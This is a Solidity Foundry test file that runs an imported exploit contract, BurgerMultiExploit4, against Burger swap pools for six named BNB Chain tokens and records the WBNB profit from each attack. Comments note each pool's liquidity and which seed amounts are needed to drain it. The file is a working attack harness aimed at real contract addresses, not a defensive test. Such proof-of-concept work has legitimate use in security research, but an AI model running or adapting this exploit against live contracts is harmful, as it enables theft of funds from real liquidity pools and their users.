// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "./BurgerMultiTest4.t.sol";

contract BurgerMultiTest8 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant xBURGER = 0xe6DF05CE8C8301223373CF5B969AFCb1498c5528;
    address constant ETH_TOKEN = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant ROCKS = 0xA01000C52b234a92563BA61e5649b7C76E1ba0f3;
    address constant bROOBEE = 0xE64F5Cb844946C1F102Bd25bBD87a5aB4aE89Fbe;

    function _tryAttack(address token, uint256 buyAmt, uint256 seedAmt, uint256 pairPct) internal returns (int256) {
        address att = makeAddr(string(abi.encodePacked("a", token, buyAmt)));
        vm.deal(att, 5000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 3000 ether}();
        IWBNB(WBNB).transfer(address(e), 3000 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));

        try e.fullAttack(token, buyAmt, seedAmt, pairPct) {
            uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
            vm.stopPrank();
            return int256(wbnbAfter) - int256(wbnbBefore);
        } catch (bytes memory reason) {
            vm.stopPrank();
            emit log_named_bytes("revert", reason);
            return type(int256).min;
        }
    }

    // Test BUSD pool (203 WBNB, swapPrecondition=true)
    function test_busd() public {
        int256 delta = _tryAttack(BUSD, 400 ether, 30 ether, 40);
        emit log_named_int("BUSD delta", delta);
    }

    // Test xBURGER pool (84 WBNB, swapPrecondition=true)
    function test_xburger() public {
        int256 delta = _tryAttack(xBURGER, 100 ether, 30 ether, 40);
        emit log_named_int("xBURGER delta", delta);
    }

    // Test ETH pool (24 WBNB, swapPrecondition=true)
    function test_eth() public {
        int256 delta = _tryAttack(ETH_TOKEN, 50 ether, 30 ether, 40);
        emit log_named_int("ETH delta", delta);
    }

    // Test USDT pool (7 WBNB, swapPrecondition=true)
    function test_usdt() public {
        int256 delta = _tryAttack(USDT, 20 ether, 30 ether, 40);
        emit log_named_int("USDT delta", delta);
    }

    // Test ROCKS pool (354 WBNB, swapPrecondition=false, need more seed)
    function test_rocks() public {
        int256 delta = _tryAttack(ROCKS, 500 ether, 100 ether, 40);
        emit log_named_int("ROCKS delta", delta);
    }

    // Test bROOBEE pool (139 WBNB, swapPrecondition=false, need more seed)
    function test_roobee() public {
        int256 delta = _tryAttack(bROOBEE, 200 ether, 50 ether, 40);
        emit log_named_int("bROOBEE delta", delta);
    }
}
